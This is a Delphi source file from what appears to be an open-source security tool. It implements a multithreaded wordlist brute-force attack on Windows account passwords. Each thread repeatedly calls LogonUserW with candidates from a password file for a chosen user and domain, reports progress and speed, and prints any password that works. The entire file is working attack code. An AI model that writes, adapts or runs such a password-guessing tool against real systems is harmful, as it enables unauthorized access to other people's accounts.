(*******************************************************************************

  Jean-Pierre LESUEUR (@DarkCoderSc)
  https://www.phrozen.io/
  jplesueur@phrozen.io

  License : MIT

*******************************************************************************)

unit UntWorker;

interface

uses Classes, Windows, SysUtils, Generics.Collections, System.SyncObjs;

type
  TWorkers = class;

  TWorker = class(TThread)
  private
    FOwner      : TWorkers;

    FLimit      : Int64;
    FUserName   : String;
    FDomainName : String;
  protected
    {@M}
    procedure Execute(); override;
  public
    {@C}
    constructor Create(AOwner : TWorkers);
  end;

  TWorkers = class
  private
    FWordListFile   : String;

    FWordList       : TThreadList<String>;
    FCursor         : Int64;
    FCount          : Int64;

    FThreadPool     : TList<TWorker>;

    FUserName       : String;
    FDomainName     : String;

    FPasswordResult : String;

    {@M}
    function Build() : Int64;
  public
    {@C}
    constructor Create(AWordListFile : String; AUserName : String; ADomainName : String = '');
    destructor Destroy(); override;

    {@M}
    function Start() : Boolean;

    {@G/S}
    property Count  : Int64 read FCount   write FCount;

    {@G}
    property Cursor     : Int64               read FCursor;
    property WordList   : TThreadList<String> read FWordList;
    property UserName   : String              read FUserName;
    property DomainName : String              read FDomainName;

    property PasswordResult : String write FPasswordResult;
  end;

implementation

uses UntFunctions;

{+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

  TWorker (Thread)

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}

{-------------------------------------------------------------------------------
  ___process
-------------------------------------------------------------------------------}
procedure TWorker.Execute();
var ARet       : Int64;
    AList      : TList<String>;
    ACandidate : String;

    {
      Exploited Windows API for Bruteforcing
    }
    function AttemptLogin(AUserName, APassword : String; ADomain : String = '') : Boolean;
    var AToken : THandle;

    const LOGON32_LOGON_INTERACTIVE = 2;
          LOGON32_PROVIDER_DEFAULT  = 0;

    begin
      result := LogonUserW(
                             PWideChar(AUserName),
                             PWideChar(ADomain),
                             PWideChar(APassword),
                             LOGON32_LOGON_INTERACTIVE, // TODO: Play with other flags
                             LOGON32_PROVIDER_DEFAULT,
                             AToken
      );

      if NOT result then
        Exit();

      ///
      CloseHandle(AToken);
    end;
begin
  try
    if NOT Assigned(FOwner) then
      Exit();
    ///

    while NOT Terminated do begin
      {
        Increment Counter, Terminate Thread if we reached the end of our wordlist
      }
      ARet := AtomicIncrement(FOwner.Cursor);
      if (ARet >= FLimit) then
        break;

      {
        Retrieve new candidate
      }
      AList := FOwner.WordList.LockList();
      try
        ACandidate := AList.Items[ARet];
      finally
        FOwner.WordList.UnlockList();
      end;

      if AttemptLogin(FUserName, ACandidate, FDomainName) then begin
        TThread.Synchronize(self, procedure begin
          FOwner.FPasswordResult := ACandidate;
        end);

        ///
        break;
      end;
    end;
  finally
    ExitThread(0);
  end;
end;

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TWorker.Create(AOwner : TWorkers);
begin
  inherited Create(True);
  ///

  self.FreeOnTerminate := True;
  self.Priority := tpNormal;

  FOwner := AOwner;

  FLimit      := FOwner.Count;
  FUserName   := FOwner.UserName;
  FDomainName := FOwner.DomainName;

  ///
  Debug(Format('New "%s" Thread created with id=%d, handle=%d', [self.ClassName, self.ThreadID, self.Handle]));
end;

{+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

  TWorkers

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}

{-------------------------------------------------------------------------------
  Start workers
-------------------------------------------------------------------------------}
function TWorkers.Start() : Boolean;
var I                : Integer;
    AWorker          : TWorker;
    AMessage         : TMsg;
    AProcCount       : Integer;
    AWordPerSec      : Int64;
    AEllapsedSeconds : Integer;

    {
      Gracefully Terminate Thread
    }
    procedure TerminateThread(AThread : TThread);
    var AExitCode : Cardinal;
    begin
      if NOT Assigned(AThread) then
        Exit;
      ///

      GetExitCodeThread(AThread.handle, AExitCode);
      if (AExitCode = STILL_ACTIVE) then begin
        AThread.Terminate();
        AThread.WaitFor();
      end;
    end;

begin
  {
    Create Threads (Max Thread = Available Process Cores)
  }
  AProcCount := GetAvailableCoreCount();
  ///

  Debug(Format('%d cores are available', [AProcCount]));

  Debug(Format('Create %d threads...', [AProcCount]), dlProcess);

  for I := 0 to AProcCount -1 do begin
    AWorker := TWorker.Create(self);

    AWorker.Resume;

    self.FThreadPool.Add(AWorker);
  end;

  Debug('Done.', dlDone);

  {
    Monitoring Thread Execution
  }
  AWordPerSec      := 1;
  AEllapsedSeconds := 0;

  while True do begin
    CheckSynchronize(1000);
    ///

    Inc(AEllapsedSeconds);

    Write(#13 + Format('Progress: %d/%d (%d%%) - %d password/s, ETA:%s', [
                                                    FCursor,
                                                    FCount,
                                                    ((FCursor * 100) div FCount),
                                                    (FCursor - AWordPerSec),
                                                    FormatDateTime('hh:nn:ss', (((FCount div (FCursor - AWordPerSec) - AEllapsedSeconds) / SecsPerDay)))

    ]));

    AWordPerSec := FCursor;

    if (FPasswordResult <> '') or (FCursor >= FCount) then
      break;
  end;
  Write(#13 + '');

  {
    Check if we found the password
  }
  if (FPasswordResult <> '') then begin
    Debug(Format('Password for username=[%s] and domain=[%s] found = [%s] ', [FUserName, FDomainName, FPasswordResult]), dlSuccess, True);
  end else begin
    Debug(Format('Password not found for username=[%s] and domain=[%s]', [FUserName, FDomainName]), dlError, True);
  end;

  {
    Finalize Threads
  }
  Debug('Finalize and close worker threads...', dlProcess);

  for I := 0 to FThreadPool.Count -1 do begin
    AWorker := FThreadPool.Items[I];

    if NOT Assigned(AWorker) then
      continue;
    ///

    TerminateThread(AWorker);

    Debug(Format('"%s"(id=%d, handle=%d) Thread successfully terminated.', [self.ClassName, AWorker.ThreadID, AWorker.Handle]));
  end;

  Debug('Done.', dlDone);

  Debug(Format('Ellapsed Time : %s', [FormatDateTime('hh:nn:ss', (AEllapsedSeconds / SecsPerDay))]));

  ///
  self.FThreadPool.Clear();
end;

{-------------------------------------------------------------------------------
  Build wordlist in memory
-------------------------------------------------------------------------------}
function TWorkers.Build() : Int64;
var AStreamReader : TStreamReader;
    ALine         : String;
    AList         : TList<String>;
begin
  result := -1; // Error
  ///

  if NOT Assigned(FWordList) then
    Exit();

  Debug(Format('Load %s file in memory...', [FWordListFile]), dlProcess);

  FWordList.Clear();
  try
    AStreamReader := TStreamReader.Create(FWordListFile, TEncoding.Default);
    try
      AList := FWordList.LockList;
      try
        {
          Read wordlist file line by line
        }
        while NOT AStreamReader.EndOfStream do begin
          ALine := AStreamReader.ReadLine();
          ///

          AList.Add(ALine);
        end;
      finally
        result := AList.Count;
        ///

        Debug(Format('%d passwords successfully loaded.', [result]), dlDone);

        FWordList.UnlockList();
      end;
    finally
      FreeAndNil(AStreamReader);
    end;
  except

  end;
end;

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TWorkers.Create(AWordListFile : String; AUserName : String; ADomainName : String = '');
begin
  FWordListFile := AWordListFile;

  FWordList := TThreadList<String>.Create();

  FUserName   := AUserName;
  FDomainName := ADomainName;

  FCount := Build();

  FCursor := -1;

  FThreadPool  := TList<TWorker>.Create();

  FPasswordResult := '';

  if (FDomainName = '') then
    FDomainName := GetEnvironmentVariable('USERDOMAIN');
  ///
end;

{-------------------------------------------------------------------------------
  ___destructor
-------------------------------------------------------------------------------}
destructor TWorkers.Destroy();
begin
  if Assigned(FWordList) then
    FreeAndNil(FWordList);

  if Assigned(FThreadPool) then
    FreeAndNil(FThreadPool);

  ///
  inherited Destroy();
end;

end.
